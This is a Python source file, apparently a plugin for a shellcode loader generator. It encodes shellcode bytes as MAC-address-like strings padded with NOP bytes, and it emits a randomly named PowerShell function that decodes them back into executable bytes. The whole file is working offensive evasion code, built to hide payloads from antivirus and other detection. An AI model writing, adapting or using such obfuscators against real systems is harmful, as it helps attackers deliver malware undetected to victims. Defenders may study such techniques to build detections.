import random
import string

class MACObfuscate:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        for i in range(0, len(decoded), 6):
            chunk = decoded[i:i+6]
            if len(chunk) < 6:
                chunk = chunk + (b"\x90" * (6 - len(chunk)))
            encoded.append('-'.join([ f'{chunk[n]:02x}' for n in range(0, 6)]))
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
function {self.name} {{
    [CmdletBinding()]
    [OutputType([byte[]])]
    param(
        [Parameter(Mandatory, ValueFromPipeline)]
        [string[]]$encoded
    )
    begin {{
        $buffer = [System.Collections.Generic.List[string]]::new()
    }}
    process {{
        $buffer.AddRange($encoded)
    }}
    end {{
        $decoded = [System.Collections.Generic.List[byte]]::new()
        foreach ($address in $buffer){{
            $octets = $address -split "-"
            foreach ($octet in $octets){{
                $decoded += [int]"0x$octet"
            }}
        }}
        return $decoded
    }}
}}
"""